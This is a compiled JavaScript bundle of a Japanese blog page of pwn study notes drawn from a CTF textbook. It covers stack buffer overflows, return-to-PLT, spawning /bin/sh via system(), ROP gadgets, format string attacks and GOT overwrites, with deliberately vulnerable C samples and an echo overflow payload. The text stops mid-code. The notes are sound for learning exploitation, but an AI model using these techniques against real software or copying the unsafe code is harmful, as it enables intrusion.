(window.webpackJsonp=window.webpackJsonp||[]).push([[15],{195:function(t,s,e){"use strict";e.r(s);var a=e(0),n=Object(a.a)({},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"content"},[t._m(0),t._v(" "),t._m(1),t._v(" "),e("p",[t._v("OSはUbuntu-18.04 LTSを使用しています。")]),t._v(" "),t._m(2),t._m(3),t._v(" "),t._m(4),t._v(" "),e("p",[t._v("GDBはCLIベースのデバッガです。\nGDBにより, 実行ファイルがオーバーフローを起こした時に, 実行ファイルが停止した位置やその時の変数の値などを知ることができます。\nまた, pedaという拡張スクリプトを追加することで,\nEBXやEIPなどの情報や関数のアドレスを取得することができます。\n非常に便利なので, インストールすることをおすすめします。")]),t._v(" "),t._m(5),t._v(" "),e("p",[t._v("objdumpはCUIベースの逆アセンブラです。\n実行ファイルを解析して, アセンブリコードを出力してくれます。")]),t._v(" "),e("p",[t._v("さて, 前置きはこのくらいにして実際に問題を見ていきましょう。")]),t._v(" "),t._m(6),t._v(" "),t._m(7),t._v(" "),t._m(8),t._m(9),t._v(" "),t._m(10),t._m(11),t._v(" "),t._m(12),t._v(" "),t._m(13),t._v(" "),t._m(14),t._v(" "),t._m(15),e("p",[t._v("これも, 先ほどと同様に, SSP無効でコンパイル。\nこの後, bufferの10バイト文を適当な文字で埋めてから, 0x12345678で埋める。")]),t._v(" "),t._m(16),e("p",[t._v("はい, おk。\nここで, リトルエンディアン形式であることに注意。")]),t._v(" "),t._m(17),t._v(" "),t._m(18),t._v(" "),t._m(19),e("p",[t._v("このままだと, EIPを奪取できない(コンパイラが防いでいるらしい)\n"),e("a",{attrs:{href:"https://hiziriai.hatenablog.com/entry/2017/05/17/234505",target:"_blank",rel:"noopener noreferrer"}},[t._v("詳しくはこの記事で"),e("OutboundLink")],1)]),t._v(" "),t._m(20),t._v(" "),t._m(21),e("p",[t._v("のように書くと,")]),t._v(" "),t._m(22),e("p",[t._v("と同じ意味になる。")]),t._v(" "),e("p",[t._v("main 630 56555630?\nprintf 410 56555554?")]),t._v(" "),e("p",[e("a",{attrs:{href:"http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/",target:"_blank",rel:"noopener noreferrer"}},[t._v("神記事"),e("OutboundLink")],1)]),t._v(" "),e("p",[t._v("system: 0xf7 e1 62 00\n引数")]),t._v(" "),t._m(23),t._m(24),t._m(25),t._v(" "),t._m(26),t._v(" "),e("p",[t._v("printf@pltを呼び出す。\nprintfを引数込みで呼び出す。")]),t._v(" "),e("p",[t._v("ret命令の挙動は, (1)現在のeipをpopして(2)そのeipのアドレスにjumpするというもの。")]),t._v(" "),e("p",[t._v("call命令は, (1)スタックにリターンアドレスを積んでから(引数も積む)(2)jumpを行うというもの。")]),t._v(" "),e("p",[t._v("したがって, ret命令でcall命令を再現するには, (1)スタックにリターンアドレスを積んでおけばおk(引数も積む)。")]),t._v(" "),t._m(27),t._v(" "),t._m(28),t._v(" "),e("p",[t._v("gdbでpattern_createおよびpattoをかけて, EIPに設定されるのが44文字目以降であることを確認。")]),t._v(" "),t._m(29),t._v(" "),e("p",[t._v("したがって, 攻撃コードは以下の通り。")]),t._v(" "),t._m(30),e("p",[t._v("と思いきや, 実行がうまくいきません。")]),t._v(" "),e("p",[t._v("調べてみると, リターンアドレスがダミーだとprintf関数が正しく実行されないようです(printf関数のret時にreturnアドレスが正しくないとSegmentationFaultになるらしい)\n"),e("a",{attrs:{href:"http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/",target:"_blank",rel:"noopener noreferrer"}},[t._v("http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/"),e("OutboundLink")],1)]),t._v(" "),t._m(31),t._v(" "),t._m(32),t._v(" "),e("p",[t._v("return to PLTではprintf関数を呼び出しましたが, 次はsystem関数を実行してみましょう。")]),t._v(" "),e("p",[t._v("system関数の実行では, /bin/sh(bash)を実行することとします。なぜなら, shellを奪えればその後はコマンドを叩いて大抵のことはできるようになるからです。")]),t._v(" "),t._m(33),t._v(" "),e("p",[t._v("まず, system関数の場所を確認します。\nmain関数にbreakpointを立ててrunし, p systemで確認できます。")]),t._v(" "),t._m(34),t._v(" "),t._m(35),e("p",[t._v("さらに, system関数は第一引数に文字列を指定する必要があるため, とりあえずbuffer変数のアドレス(0x0804a060)を指定します。")]),t._v(" "),e("p",[t._v("すると, 以下のようなスタックの状況を作れれば攻撃が成功しそうです。")]),t._v(" "),t._m(36),t._v(" "),t._m(37),t._v(" "),e("p",[t._v("echoでかくと, 以下のようになる。")]),t._v(" "),t._m(38),e("p",[t._v("pythonでかくと, 以下のようになる(echoの時は挿入されている\\n(改行コード)がないため, \\nを挿入している)。")]),t._v(" "),t._m(39),t._m(40),t._v(" "),t._m(41),t._v(" "),e("p",[t._v("先程までの例では, main関数のリターンアドレスとしてmain関数のアドレスを利用していた。\nしかし, このリターンアドレスに他の関数のリターンアドレスを埋め込んでおけば2つめの関数を呼び出すことが可能になる。")]),t._v(" "),e("p",[t._v("しかし、以下のように、単純に関数を設定するだけだとスタックの中身が散乱してしまう。")]),t._v(" "),t._m(42),t._v(" "),e("p",[t._v("そこで, popret gadgetの考え方を使う。\n実行ファイルの中にpopを数回おこなった後にretするという処理(gadget)が多く現れる。これに倣い, 関数を呼び出すために使用した引数分popしてからretすればスタックポインタの位置をずらすことができそう。")]),t._v(" "),t._m(43),t._v(" "),e("p",[t._v("これを活用して, プログラムを以上終了させるためにexitを呼び出してみる。")]),t._v(" "),t._m(44),t._v(" "),t._m(45),t._v(" "),e("p",[t._v("???")]),t._v(" "),t._m(46),t._v(" "),t._m(47),t._v(" "),t._m(48),t._m(49),t._v(" "),t._m(50),t._v(" "),t._m(51),t._v(" "),e("p",[t._v("そのため, 入力としてsecretのアドレスをあたえ, 7番目の値を参照すればおk。")]),t._v(" "),e("p",[t._v("~なぜか6番目で正しく実行できているので, 0-indexedなのかも?~~\n7番目でした。")]),t._v(" "),t._m(52),e("p",[t._v("ここで, 00000005から\\x78\\x56\\x34\\x12が続いているため, その正当性が確認できる。")]),t._v(" "),t._m(53),t._v(" "),e("p",[t._v("secret = 0x0804a024")]),t._v(" "),t._m(54),t._v(" "),t._m(55),t._m(56),t._v(" "),t._m(57),t._v(" "),e("p",[t._v("GOTとは, ライブラリの関数アドレスを保存しておく領域のこと。\nGOT領域を書き換えることで, eipを変更したことと同じことになる。")]),t._v(" "),t._m(58),t._v(" "),e("p",[t._v("デコンパイルをすると, fgets→printf→fgets→strlen→printfという流れで関数が呼び出されていることがわかる。")]),t._v(" "),e("p",[t._v("したがって, 最初のfgetsで, 次にくるprintfでstrlenをsystem関数に書き換える攻撃コードを流し込み, 2度目のfgets関数でstrにsystem関数の引数を設定してstrlen(str)でシェルを起動する。")]),t._v(" "),e("p",[t._v("GOT領域は以下のコマンドで確認できる。")]),t._v(" "),t._m(59),t._m(60),t._v(" "),t._m(61),t._v(" "),t._m(62),t._m(63),t._v(" "),e("p",[t._v("この文字列を入れる番地を知るために, 書式文字列攻撃を行う。")]),t._v(" "),t._m(64),e("p",[t._v("以上より, 7番目に引数が格納されることがわかった。")]),t._v(" "),t._m(65),t._v(" "),e("p",[t._v("したがって, 攻撃文字列は以下な形式になる。")]),t._v(" "),t._m(66),t._v(" "),e("p",[t._v("したがって, 攻撃コードは以下のようになる。")]),t._v(" "),t._m(67),t._v(" "),t._m(68),t._m(69),t._v(" "),t._m(70),t._v(" "),t._m(71),t._m(72),t._v(" "),e("p",[t._v("ブルートフォースで回避する。")]),t._v(" "),e("p",[t._v("以下のコマンドでASLRを有効にする。")]),t._v(" "),t._m(73),t._m(74),t._v(" "),t._m(75),e("p",[t._v("ここで, libc.so.6に存在するsystem関数の相対番地を確認しておく。")]),t._v(" "),t._m(76),t._m(77),t._v(" "),t._m(78),t._m(79),t._v(" "),t._m(80),t._v(" "),t._m(81),t._v(" "),e("p",[t._v("これらの情報を元に, 攻撃コードを組み立てる。")]),t._v(" "),e("p",[t._v("工事中...")]),t._v(" "),t._m(82),t._v(" "),e("ul",[e("li",[t._v("磯井利宜・他 (2015)『セキュリティコンテストチャレンジブック-CTFで学ぼう!情報を守るための戦い方』マイナビ出版")]),t._v(" "),e("li",[e("a",{attrs:{href:"https://gist.github.com/matsubara0507/72dc50c89200a09f7c61",target:"_blank",rel:"noopener noreferrer"}},[t._v("たのしいPwn入門"),e("OutboundLink")],1)])])])},[function(){var t=this.$createElement,s=this._self._c||t;return s("h1",{attrs:{id:"ハリネズミ本-pwnのめも"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ハリネズミ本-pwnのめも","aria-hidden":"true"}},[this._v("#")]),this._v(" ハリネズミ本 pwnのめも")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h1",{attrs:{id:"実行環境"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#実行環境","aria-hidden":"true"}},[this._v("#")]),this._v(" 実行環境")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" /etc/os-release \nNAME"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Ubuntu"')]),t._v("\nVERSION"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"18.04.2 LTS (Bionic Beaver)"')]),t._v("\nID"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("ubuntu\nID_LIKE"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("debian\nPRETTY_NAME"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Ubuntu 18.04.2 LTS"')]),t._v("\nVERSION_ID"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"18.04"')]),t._v("\nHOME_URL"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"https://www.ubuntu.com/"')]),t._v("\nSUPPORT_URL"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"https://help.ubuntu.com/"')]),t._v("\nBUG_REPORT_URL"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"https://bugs.launchpad.net/ubuntu/"')]),t._v("\nPRIVACY_POLICY_URL"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"')]),t._v("\nVERSION_CODENAME"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("bionic\nUBUNTU_CODENAME"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("bionic\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br"),e("span",{staticClass:"line-number"},[t._v("11")]),e("br"),e("span",{staticClass:"line-number"},[t._v("12")]),e("br"),e("span",{staticClass:"line-number"},[t._v("13")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h1",{attrs:{id:"使用するツール"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#使用するツール","aria-hidden":"true"}},[this._v("#")]),this._v(" 使用するツール")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"gdb-peda"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#gdb-peda","aria-hidden":"true"}},[this._v("#")]),this._v(" GDB(peda)")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"objdump"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#objdump","aria-hidden":"true"}},[this._v("#")]),this._v(" objdump")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h1",{attrs:{id:"stack-base-buffer-overflow"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#stack-base-buffer-overflow","aria-hidden":"true"}},[this._v("#")]),this._v(" stack base buffer overflow")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"ローカル変数の破壊"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ローカル変数の破壊","aria-hidden":"true"}},[this._v("#")]),this._v(" ローカル変数の破壊")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-cpp line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-cpp"}},[e("code",[e("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// bof1.c")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("#"),e("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n\n"),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" argc"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("argv"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" zero "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buffer"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("10")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  \n  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("fgets")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buffer"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("64")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token constant"}},[t._v("stdin")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"zero = %d\\n"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" zero"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br"),e("span",{staticClass:"line-number"},[t._v("11")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("上のコードを32bit向け, SSP(stack smash protection)無効でコンパイルする.\nこの後, "),s("code",[this._v("AAAAAAAAAAAAAAAAAAAA")]),this._v("のような文字列を与えることでbuffer overflowを意図的に引き起こす。")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ gcc -m32 -fno-stack-protector ./bof1 ./bof1.c\n$ ./bof1\nbuffer address  "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" ffffd062\nzero address    "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" ffffd06c\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nzero "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" 1094795585\nSegmentation fault "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("core dumped"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("p",[t._v("ここで, buffer addressが"),e("code",[t._v("ffffd062")]),t._v("で, zero addressが"),e("code",[t._v("ffffd06c")]),t._v("なのは,\nmain関数の中で順番に変数がstackに積まれて行くから("),e("code",[t._v("ffffd062")]),t._v(" + "),e("code",[t._v("10")]),t._v(" = "),e("code",[t._v("ffffd06c")]),t._v(")。")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("p",[t._v("実行結果が, "),e("code",[t._v("1094795585")]),t._v("となっているのは, "),e("code",[t._v("AAAA")]),t._v("="),e("code",[t._v("0x41414141")]),t._v(" = "),e("code",[t._v("1094795585")]),t._v("だから。")])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("これを用いて, 任意の値を"),s("code",[this._v("zero")]),this._v("に代入してみる。")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"bofを活用した-任意の数字の書き換え"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#bofを活用した-任意の数字の書き換え","aria-hidden":"true"}},[this._v("#")]),this._v(" bofを活用した, 任意の数字の書き換え")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-cpp line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-cpp"}},[e("code",[e("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("#"),e("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n\n"),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" argc"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("argv"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" zero "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buffer"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("10")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"buffer address\\t= %x\\n"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("buffer"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"zero address\\t= %x\\n"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("zero"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  \n  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("fgets")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buffer"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("64")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token constant"}},[t._v("stdin")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"zero = %d\\n"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" zero"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("zero "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x12345678")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"congrats!\\n"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br"),e("span",{staticClass:"line-number"},[t._v("11")]),e("br"),e("span",{staticClass:"line-number"},[t._v("12")]),e("br"),e("span",{staticClass:"line-number"},[t._v("13")]),e("br"),e("span",{staticClass:"line-number"},[t._v("14")]),e("br"),e("span",{staticClass:"line-number"},[t._v("15")]),e("br"),e("span",{staticClass:"line-number"},[t._v("16")]),e("br")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ gcc -m32 -fno-stack-protector -o ./bof2 ./bof2.c\n$ "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" -e "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'AAAAAAAAAA\\x78\\x56\\x34\\x12'")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./bof2\nbuffer address                         "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" ffffd062\nzero address                           "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" ffffd06c\nzero "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" 12345678\ncongrats"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("\nSegmentation fault "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("core dumped"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("p",[e("code",[t._v("$ echo -e 'AAAAAAAAAA\\x78\\x56\\x34\\x12' | ./bof2")]),t._v("\nについて, "),e("code",[t._v("-e")]),t._v("オプションは"),e("code",[t._v("\\x")]),t._v("表記を認めるというオプション。\nリトルエンディアン形式なので, "),e("code",[t._v("\\x78\\x56\\x34\\x12")]),t._v("という表記になっている。")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h1",{attrs:{id:"bofを活用した-リターンアドレスの書き換え"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#bofを活用した-リターンアドレスの書き換え","aria-hidden":"true"}},[this._v("#")]),this._v(" bofを活用した, リターンアドレスの書き換え")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-c line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-c"}},[e("code",[e("span",{pre:!0,attrs:{class:"token macro 